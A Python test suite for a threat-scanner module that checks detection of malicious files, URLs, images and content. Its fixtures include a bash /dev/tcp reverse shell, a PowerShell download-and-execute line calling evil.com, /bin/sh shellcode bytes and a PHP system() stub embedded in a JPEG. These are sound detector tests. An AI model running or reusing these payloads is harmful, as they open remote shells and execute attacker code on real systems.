import hashlib, json, os, sys, tempfile, types, shutil
from pathlib import Path
from unittest.mock import MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

_MOCK = [
    'sentencepiece','torch','torch.nn','torch.nn.functional','torch.cuda',
    'torch.utils','torch.utils.data','torch.optim','torch.nn.utils',
    'torch.nn.utils.rnn','transformers','tokenizers','chromadb',
    'chromadb.config','sklearn','sklearn.feature_extraction',
    'sklearn.feature_extraction.text','sklearn.metrics',
    'sklearn.metrics.pairwise','numpy','pandas','rank_bm25','httpx',
    'aiohttp','pptx','pptx.util','pptx.enum','pptx.enum.text',
    'PIL','PIL.Image','pdfplumber','openai',
]
for m in _MOCK:
    if m not in sys.modules:
        sys.modules[m] = MagicMock()

sys.modules['config.settings'] = types.ModuleType('config.settings')
sys.modules['config.settings'].brain_config = MagicMock()
sys.modules['config.settings'].agent_config = MagicMock()
_tmp = Path(tempfile.gettempdir())
sys.modules['config.settings'].BASE_DIR = _tmp
sys.modules['config.settings'].DATA_DIR = _tmp / 'test_data'
sys.modules['config.settings'].MEMORY_DIR = _tmp / 'test_memory'
sys.modules['config.settings'].UPLOADS_DIR = _tmp / 'test_uploads'

from agents.safety.threat_scanner import (
    ThreatScanner, ThreatReport, ThreatType, ThreatSeverity,
    ScanTarget, ThreatEvidence,
)


def mk(content, suffix='.txt'):
    fd, path = tempfile.mkstemp(suffix=suffix)
    os.write(fd, content)
    os.close(fd)
    return path


def rm(path):
    try:
        if os.path.exists(path):
            os.unlink(path)
    except Exception:
        pass


def test_signature():
    s = ThreatScanner()
    c = b'malware_test_' + os.urandom(16)
    p = mk(c)
    try:
        h = hashlib.sha256(c).hexdigest()
        s.add_signature(h)
        r = s.scan_file(p)
        assert r.is_threat, 'Known hash not detected'
        assert r.confidence >= 0.9
        assert any('known_malware_hash' in e.rule_name for e in r.evidence)
        print('  PASS: Signature scanner')
    finally:
        rm(p)


def test_entropy():
    s = ThreatScanner(entropy_threshold=7.0)
    p = mk(os.urandom(4096), '.bin')
    try:
        r = s.scan_file(p)
        assert any('high_entropy' in e.rule_name for e in r.evidence)
        print('  PASS: High entropy detection')
    finally:
        rm(p)


def test_disguised():
    s = ThreatScanner()
    pe = b'\x4d\x5a' + b'\x00' * 100 + b'\x50\x45\x00\x00' + b'\x00' * 200
    p = mk(pe, '.jpg')
    try:
        r = s.scan_file(p)
        assert any('disguised_file_type' in e.rule_name for e in r.evidence)
        print('  PASS: Disguised file detection')
    finally:
        rm(p)


def test_double_ext():
    s = ThreatScanner()
    p = mk(b'fake content', '.pdf.exe')
    try:
        r = s.scan_file(p)
        assert any('double_extension' in e.rule_name for e in r.evidence)
        print('  PASS: Double extension detection')
    finally:
        rm(p)


def test_dangerous_ext():
    s = ThreatScanner()
    p = mk(b'echo hello', '.bat')
    try:
        r = s.scan_file(p)
        assert any('dangerous_extension' in e.rule_name for e in r.evidence)
        print('  PASS: Dangerous extension flagged')
    finally:
        rm(p)


def test_phishing_url():
    s = ThreatScanner()
    r = s.scan_url('http://secure-login-verify.com/account/update/password')
    assert any('phishing_keywords' in e.rule_name for e in r.evidence)
    print('  PASS: Phishing URL detection')


def test_ip_url():
    s = ThreatScanner()
    r = s.scan_url('http://192.168.1.100/malware/download')
    assert any('ip_based_url' in e.rule_name for e in r.evidence)
    print('  PASS: IP-based URL')


def test_suspicious_tld():
    s = ThreatScanner()
    r = s.scan_url('http://totally-legit-site.tk/login')
    assert any('suspicious_tld' in e.rule_name for e in r.evidence)
    print('  PASS: Suspicious TLD')


def test_homograph():
    s = ThreatScanner()
    # Cyrillic o instead of Latin o
    r = s.scan_url('http://g\u043e\u043egle.com/login')
    assert any('idn_homograph' in e.rule_name for e in r.evidence)
    assert r.is_threat
    print('  PASS: IDN homograph attack')


def test_dangerous_protocol():
    s = ThreatScanner()
    r = s.scan_url('javascript:alert(1)')
    assert any('dangerous_protocol' in e.rule_name for e in r.evidence)
    print('  PASS: Dangerous protocol')


def test_safe_url():
    s = ThreatScanner()
    r = s.scan_url('https://www.google.com/search?q=hello')
    assert not r.is_threat
    print('  PASS: Safe URL passes')


def test_reverse_shell():
    s = ThreatScanner()
    r = s.scan_content('bash -i > /dev/tcp/10.0.0.1/4444 0>&1')
    assert r.is_threat
    assert any('reverse_shell' in e.rule_name for e in r.evidence)
    print('  PASS: Reverse shell')


def test_ransomware():
    s = ThreatScanner()
    c = 'Fernet(key).encrypt(data)\nopen(f+".locked","wb")\npay the ransom to bitcoin wallet'
    r = s.scan_content(c)
    assert r.is_threat
    print('  PASS: Ransomware indicators')


def test_powershell():
    s = ThreatScanner()
    c = 'powershell -EncodedCommand JAB IEX (New-Object Net.WebClient).DownloadString("http://evil.com")'
    r = s.scan_content(c)
    assert r.is_threat
    print('  PASS: Obfuscated PowerShell')


def test_shellcode():
    s = ThreatScanner()
    sc = '\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05'
    r = s.scan_content(sc)
    assert r.is_threat
    assert any('shellcode_hex' in e.rule_name for e in r.evidence)
    print('  PASS: Hex shellcode')


def test_keylogger():
    s = ThreatScanner()
    r = s.scan_content('from pynput.keyboard import Listener\ndef on_press(key): pass')
    assert r.is_threat
    print('  PASS: Keylogger indicators')


def test_clean_content():
    s = ThreatScanner()
    r = s.scan_content('def add(a, b): return a + b\nprint(add(2, 3))')
    assert not r.is_threat
    print('  PASS: Clean content passes')


def test_image_php():
    s = ThreatScanner()
    data = b'\xff\xd8\xff\xe0' + b'\x00' * 100 + b"<?php system('id'); ?>" + b'\xff\xd9'
    p = mk(data, '.jpg')
    try:
        r = s.scan_image(p)
        assert any('embedded_php' in e.rule_name for e in r.evidence)
        print('  PASS: Embedded PHP in image')
    finally:
        rm(p)


def test_image_trailing():
    s = ThreatScanner()
    data = b'\xff\xd8\xff\xe0' + b'\x00' * 50 + b'\xff\xd9' + b'HIDDEN_PAYLOAD' * 100
    p = mk(data, '.jpg')
    try:
        r = s.scan_image(p)
        assert any('jpeg_trailing_data' in e.rule_name for e in r.evidence)
        print('  PASS: JPEG trailing data')
    finally:
        rm(p)


def test_image_clean():
    s = ThreatScanner()
    data = b'\xff\xd8\xff\xe0' + b'\x00' * 50 + b'\xff\xd9'
    p = mk(data, '.jpg')
    try:
        r = s.scan_image(p)
        assert not r.is_threat
        print('  PASS: Clean image passes')
    finally:
        rm(p)


def test_quarantine():
    qd = tempfile.mkdtemp(prefix='tq_')
    s = ThreatScanner(quarantine_dir=qd)
    c = b'MALWARE_' + os.urandom(32)
    s.add_signature(hashlib.sha256(c).hexdigest())
    p = mk(c, '.exe')
    try:
        rep = s.scan_file(p)
        assert rep.is_threat
        res = s.quarantine(rep)
        assert res['success'], res.get('error')
        assert not os.path.exists(p)
        assert os.path.exists(res['quarantine_path'])
        assert rep.remediation_status == 'quarantined'
        print('  PASS: Quarantine workflow')
    finally:
        shutil.rmtree(qd, ignore_errors=True)


def test_destroy():
    qd = tempfile.mkdtemp(prefix='td_')
    s = ThreatScanner(quarantine_dir=qd)
    c = b'DELETE_ME_' + os.urandom(32)
    h = hashlib.sha256(c).hexdigest()
    s.add_signature(h)
    p = mk(c, '.mal')
    try:
        rep = s.scan_file(p)
        assert rep.is_threat
        res = s.destroy(rep)
        assert res['success'], res.get('error')
        assert not os.path.exists(p)
        prf = res['destruction_proof']
        assert prf['pre_destruction_hash'] == h
        assert prf['overwrite_passes'] == 3
        assert prf['verified_deleted'] is True
        assert 'proof_hash' in prf
        assert rep.remediation_status == 'destroyed'
        print('  PASS: Secure destroy (3-pass, proof)')
    finally:
        shutil.rmtree(qd, ignore_errors=True)


def test_report_format():
    r = ThreatReport(
        target='/test.exe',
        target_type=ScanTarget.FILE,
        is_threat=True,
        threat_type=ThreatType.MALWARE,
        severity=ThreatSeverity.HIGH,
        confidence=0.85,
        evidence=[ThreatEvidence(
            layer='L1', rule_name='test', description='Test', confidence=0.9,
        )],
    )
    assert 'THREAT DETECTED' in r.summary()
    assert 'THREAT SCAN REPORT' in r.detailed_report()
    d = r.to_dict()
    assert d['is_threat'] is True
    assert d['threat_type'] == 'malware'
    print('  PASS: Report formatting')


def test_stats():
    s = ThreatScanner()
    p = mk(b'safe content', '.txt')
    try:
        s.scan_file(p)
        assert s.stats['total_scans'] == 1
        assert s.stats['clean_files'] == 1
        s.scan_content('hello world')
        assert s.stats['total_scans'] == 2
        print('  PASS: Scanner stats')
    finally:
        rm(p)


def test_nonexistent():
    s = ThreatScanner()
    r = s.scan_file('/nonexistent/path/file.txt')
    assert not r.is_threat
    print('  PASS: Nonexistent file handled')


def test_safe_files():
    s = ThreatScanner()
    for content, suffix in [(b'Hello world\n', '.txt'), (b'def f(): pass\n', '.py'), (b'{"a":1}', '.json')]:
        p = mk(content, suffix)
        try:
            assert not s.scan_file(p).is_threat, f'False positive on {suffix}'
        finally:
            rm(p)
    print('  PASS: Safe files pass (txt, py, json)')


def test_file_with_urls():
    s = ThreatScanner()
    c = b'<a href="http://192.168.1.1/steal/password/login">Click</a>'
    p = mk(c, '.html')
    try:
        r = s.scan_file(p)
        has_url = any('Layer 3' in e.layer for e in r.evidence)
        assert has_url, 'Malicious URLs in file not detected'
        print('  PASS: Malicious URLs in files')
    finally:
        rm(p)


if __name__ == '__main__':
    print('\n' + '=' * 56)
    print('  THREAT SCANNER TEST SUITE')
    print('=' * 56)

    tests = [
        test_signature, test_entropy, test_disguised, test_double_ext,
        test_dangerous_ext, test_phishing_url, test_ip_url, test_suspicious_tld,
        test_homograph, test_dangerous_protocol, test_safe_url,
        test_reverse_shell, test_ransomware, test_powershell, test_shellcode,
        test_keylogger, test_clean_content,
        test_image_php, test_image_trailing, test_image_clean,
        test_quarantine, test_destroy,
        test_report_format, test_stats, test_nonexistent,
        test_safe_files, test_file_with_urls,
    ]

    ok = fail = 0
    for t in tests:
        try:
            t()
            ok += 1
        except AssertionError as e:
            print(f'  FAIL: {t.__name__}: {e}')
            fail += 1
        except Exception as e:
            print(f'  ERROR: {t.__name__}: {type(e).__name__}: {e}')
            fail += 1

    print('=' * 56)
    if fail == 0:
        print(f'  ALL {ok} TESTS PASSED!')
    else:
        print(f'  {ok}/{ok + fail} passed, {fail} FAILED')
    print('=' * 56 + '\n')
